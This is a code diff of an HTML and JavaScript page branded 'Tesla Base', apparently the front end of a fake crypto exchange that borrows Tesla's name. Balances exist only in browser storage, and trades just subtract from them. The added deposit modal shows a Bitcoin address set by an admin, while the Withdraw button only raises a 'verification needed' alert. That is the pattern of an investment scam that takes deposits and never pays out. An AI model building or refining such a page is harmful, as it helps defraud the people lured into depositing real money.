@@ -3,60 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tesla Base | Live Trade</title>
+    <title>Tesla Base | Full Exchange</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --bg: #000; --card: #121212; --tesla-red: #E31937; --text: #fff; --gray: #8e8e8e; --border: #1f1f1f; --green: #00ff88; --red: #ff3b3b; }
-        body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }
+        body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 90px; }
+        
         .header { display: flex; justify-content: space-between; padding: 20px; align-items: center; border-bottom: 1px solid var(--border); }
         .assets-card { padding: 20px; border-bottom: 8px solid #0a0a0a; }
         .bal-usd { font-size: 36px; font-weight: 700; margin: 5px 0; }
+        
+        /* RESTORED QUICK ACTION BUTTONS */
+        .actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 20px; text-align: center; }
+        .act-item { background: #1c1c1c; padding: 15px 5px; border-radius: 12px; font-size: 12px; cursor: pointer; border: 1px solid #222; }
+        .act-item i { display: block; font-size: 22px; margin-bottom: 8px; color: var(--tesla-red); }
+
         .asset-row { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border); align-items: center; cursor: pointer; }
         .coin-info { display: flex; gap: 12px; align-items: center; }
-        .coin-info img { width: 35px; height: 35px; border-radius: 50%; }
-        
-        /* Trade Modal */
+        .coin-info img { width: 35px; height: 35px; border-radius: 50%; background: #fff; padding: 2px; }
+
+        /* Trade Screen Modal */
         #trade-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); z-index:5000; overflow-y: auto; }
         .chart-container { width: 100%; height: 400px; background: #000; }
         .trade-form { padding: 20px; background: var(--card); border-top: 1px solid var(--border); }
         .trade-input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; margin-bottom: 15px; font-size: 18px; box-sizing: border-box;}
-        .trade-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .btn-buy { background: var(--green); color: #000; padding: 18px; border-radius: 8px; border:none; font-weight: 900; cursor: pointer;}
-        .btn-sell { background: var(--red); color: #fff; padding: 18px; border-radius: 8px; border:none; font-weight: 900; cursor: pointer;}
         
-        /* Active Trades */
-        .active-trade-card { margin: 10px 20px; padding: 15px; background: #1a1a1a; border-radius: 10px; border-left: 4px solid var(--tesla-red); }
-        .close-btn { background: var(--tesla-red); color: #fff; border: none; padding: 5px 10px; border-radius: 4px; float: right; cursor: pointer;}
+        /* Deposit Warning Modal */
+        #dep-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:6000; padding:20px; }
+        .warn-box { background:var(--card); border: 2px solid var(--tesla-red); border-radius:15px; padding:25px; margin-top:40px; text-align:center; }
 
         .nav { position: fixed; bottom: 0; width: 100%; display: flex; background: var(--bg); border-top: 1px solid var(--border); padding: 12px 0; z-index: 100; }
-        .nav-item { flex: 1; text-align: center; font-size: 10px; text-decoration: none; color: var(--gray); }
+        .nav-item { flex: 1; text-align: center; font-size: 10px; color: var(--gray); text-decoration: none; }
         .nav-item.active { color: #fff; }
     </style>
 </head>
 <body>
 
+    <div id="dep-modal">
+        <div class="warn-box">
+            <i class="fa-solid fa-triangle-exclamation" style="color:var(--tesla-red); font-size:40px;"></i>
+            <h2 style="margin:15px 0;">IMPORTANT</h2>
+            <p style="color:var(--gray); font-size:14px;">ONLY SEND <b style="color:#fff;">BITCOIN (BTC)</b> TO THIS ADDRESS. ANY OTHER COIN WILL BE LOST.</p>
+            <div id="wallet-addr" style="background:#000; padding:15px; margin:20px 0; border:1px dashed #555; word-break:break-all; font-family:monospace; color:var(--tesla-red);"></div>
+            <button onclick="closeDep()" style="width:100%; background:var(--tesla-red); color:#fff; border:none; padding:15px; border-radius:8px; font-weight:bold;">COPY & CLOSE</button>
+        </div>
+    </div>
+
     <div id="trade-screen">
         <div class="header">
             <i class="fa-solid fa-chevron-left" onclick="closeTrade()"></i>
-            <div id="t-title" style="font-weight:bold;">BTC/USDT</div>
-            <div></div>
+            <div id="t-title" style="font-weight:bold;">BTC/USD</div>
+            <i class="fa-solid fa-headset"></i>
         </div>
-        
         <div id="tradingview_chart" class="chart-container"></div>
-
         <div class="trade-form">
-            <div style="margin-bottom: 10px; font-size: 14px; color: var(--gray);">Available: <span id="t-bal" style="color:#fff;">$0.00</span></div>
-            <input type="number" id="trade-amount" class="trade-input" placeholder="Amount to Invest ($)">
-            <div class="trade-btns">
-                <button class="btn-buy" onclick="executeTrade('BUY')">BUY / LONG</button>
-                <button class="btn-sell" onclick="executeTrade('SELL')">SELL / SHORT</button>
+            <input type="number" id="trade-amount" class="trade-input" placeholder="Enter Amount ($)">
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+                <button onclick="executeTrade('BUY')" style="background:var(--green); color:#000; padding:15px; border-radius:8px; border:none; font-weight:900;">BUY</button>
+                <button onclick="executeTrade('SELL')" style="background:var(--red); color:#fff; padding:15px; border-radius:8px; border:none; font-weight:900;">SELL</button>
             </div>
         </div>
     </div>
 
     <div class="header">
         <div style="font-weight:900; color:var(--tesla-red); letter-spacing:2px;">TESLA BASE</div>
-        <i class="fa-solid fa-user-circle"></i>
+        <i class="fa-solid fa-bell"></i>
     </div>
 
     <div class="assets-card">
@@ -64,139 +75,57 @@
         <div class="bal-usd" id="u-usd">$0.00</div>
     </div>
 
-    <div id="active-positions-header" style="padding: 10px 20px; font-weight: bold; color: var(--tesla-red); display:none;">ACTIVE TRADES</div>
-    <div id="active-positions"></div>
+    <div class="actions">
+        <div class="act-item" onclick="openDep()"><i class="fa-solid fa-wallet"></i>Deposit</div>
+        <div class="act-item" onclick="alert('Withdrawal verification needed.')"><i class="fa-solid fa-arrow-up-from-bracket"></i>Withdraw</div>
+        <div class="act-item" onclick="alert('Swap system active.')"><i class="fa-solid fa-rotate"></i>Convert</div>
+    </div>
 
-    <div style="padding: 20px; font-weight: bold;">MARKETS</div>
     <div id="asset-list"></div>
 
     <nav class="nav">
         <a href="#" class="nav-item active"><i class="fa-solid fa-house"></i>Home</a>
         <a href="#" class="nav-item"><i class="fa-solid fa-chart-line"></i>Trade</a>
-        <a href="#" class="nav-item"><i class="fa-solid fa-bolt"></i>Invest</a>
+        <a href="#" class="nav-item"><i class="fa-solid fa-user"></i>Profile</a>
     </nav>
 
     <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <script>
-        let selectedAsset = "";
-        let currentPrice = 0;
-        let activeTrades = JSON.parse(localStorage.getItem('userTrades')) || [];
-
         const assets = [
             { s: 'TSLA', n: 'Tesla Inc.', p: 202.45, i: 'https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png' },
             { s: 'BTC', n: 'Bitcoin', p: 68420.00, i: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png' },
-            { s: 'ETH', n: 'Ethereum', p: 3510.12, i: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
-            { s: 'USDT', n: 'Tether', p: 1.00, i: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
+            { s: 'ETH', n: 'Ethereum', p: 3510.12, i: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' }
         ];
 
         function render() {
-            const bal = parseFloat(localStorage.getItem('userBalance')) || 0;
-            document.getElementById('u-usd').innerText = "$" + bal.toLocaleString(undefined, {minimumFractionDigits:2});
-            document.getElementById('t-bal').innerText = "$" + bal.toLocaleString();
-
+            const b = parseFloat(localStorage.getItem('userBalance')) || 0;
+            document.getElementById('u-usd').innerText = "$" + b.toLocaleString();
             document.getElementById('asset-list').innerHTML = assets.map(a => `
-                <div class="asset-row" onclick="openTrade('${a.s}', ${a.p})">
-                    <div class="coin-info"><img src="${a.i}"><div><b>${a.s}</b><br><small style="color:#8e8e8e">${a.n}</small></div></div>
-                    <div style="text-align:right;"><b>$${a.p.toFixed(2)}</b></div>
+                <div class="asset-row" onclick="openTrade('${a.s}')">
+                    <div class="coin-info"><img src="${a.i}"><div><b>${a.s}</b><br><small>${a.n}</small></div></div>
+                    <b>$${a.p.toFixed(2)}</b>
                 </div>`).join('');
-
-            renderActiveTrades();
         }
 
-        function openTrade(s, p) {
-            selectedAsset = s;
-            currentPrice = p;
+        function openTrade(s) {
             document.getElementById('trade-screen').style.display = 'block';
-            document.getElementById('t-title').innerText = s + "/USD";
-
-            // Initialize TradingView Widget
-            new TradingView.widget({
-                "autosize": true,
-                "symbol": s === "TSLA" ? "NASDAQ:TSLA" : "BINANCE:" + s + "USDT",
-                "interval": "1",
-                "timezone": "Etc/UTC",
-                "theme": "dark",
-                "style": "1",
-                "locale": "en",
-                "toolbar_bg": "#f1f3f6",
-                "enable_publishing": false,
-                "hide_top_toolbar": true,
-                "save_image": false,
-                "container_id": "tradingview_chart"
-            });
+            new TradingView.widget({ "autosize": true, "symbol": "BINANCE:"+s+"USDT", "theme": "dark", "container_id": "tradingview_chart" });
         }
-
         function closeTrade() { document.getElementById('trade-screen').style.display = 'none'; }
+        
+        function openDep() { 
+            document.getElementById('wallet-addr').innerText = localStorage.getItem('dep_info') || "Contact Admin";
+            document.getElementById('dep-modal').style.display = 'block'; 
+        }
+        function closeDep() { document.getElementById('dep-modal').style.display = 'none'; }
 
-        function executeTrade(type) {
+        function executeTrade(t) {
             const amt = parseFloat(document.getElementById('trade-amount').value);
-            let bal = parseFloat(localStorage.getItem('userBalance')) || 0;
-
-            if (isNaN(amt) || amt <= 0 || amt > bal) {
-                alert("Invalid Amount or Insufficient Funds.");
-                return;
-            }
-
-            // Deduct funds from balance immediately
-            bal -= amt;
-            localStorage.setItem('userBalance', bal.toFixed(2));
-
-            const newTrade = {
-                id: Date.now(),
-                asset: selectedAsset,
-                type: type,
-                entry: currentPrice,
-                amount: amt,
-                time: new Date().toLocaleTimeString()
-            };
-
-            activeTrades.push(newTrade);
-            localStorage.setItem('userTrades', JSON.stringify(activeTrades));
-            
-            alert(`${type} Order Placed. $${amt} deducted from balance.`);
-            document.getElementById('trade-amount').value = "";
-            closeTrade();
-            render();
-        }
-
-        function renderActiveTrades() {
-            const container = document.getElementById('active-positions');
-            if (activeTrades.length > 0) {
-                document.getElementById('active-positions-header').style.display = 'block';
-                container.innerHTML = activeTrades.map(t => {
-                    // Simulating live profit/loss (0.5% fluctuation for demo)
-                    const pl = (Math.random() - 0.45) * (t.amount * 0.1); 
-                    const color = pl >= 0 ? 'var(--green)' : 'var(--red)';
-                    return `
-                    <div class="active-trade-card">
-                        <button class="close-btn" onclick="closePosition(${t.id}, ${pl})">CLOSE</button>
-                        <b>${t.asset} ${t.type}</b> <br>
-                        <small>Entry: $${t.entry.toFixed(2)} | Invested: $${t.amount}</small><br>
-                        <span style="color:${color}; font-weight:bold;">Profit/Loss: ${pl >= 0 ? '+' : ''}$${pl.toFixed(2)}</span>
-                    </div>`;
-                }).join('');
-            } else {
-                document.getElementById('active-positions-header').style.display = 'none';
-                container.innerHTML = "";
-            }
-        }
-
-        function closePosition(id, pl) {
-            const tradeIndex = activeTrades.findIndex(t => t.id === id);
-            const trade = activeTrades[tradeIndex];
-            
-            let bal = parseFloat(localStorage.getItem('userBalance')) || 0;
-            
-            // Return original investment + profit/loss accurately
-            const returnAmt = trade.amount + pl;
-            bal += returnAmt;
-            
-            localStorage.setItem('userBalance', bal.toFixed(2));
-            activeTrades.splice(tradeIndex, 1);
-            localStorage.setItem('userTrades', JSON.stringify(activeTrades));
-            
-            alert(`Trade Closed. $${returnAmt.toFixed(2)} returned to balance.`);
-            render();
+            let b = parseFloat(localStorage.getItem('userBalance')) || 0;
+            if(amt > b) return alert("Insufficient Balance");
+            localStorage.setItem('userBalance', (b - amt).toFixed(2));
+            alert(t + " successful. $" + amt + " invested.");
+            render(); closeTrade();
         }
 
         window.onload = render;
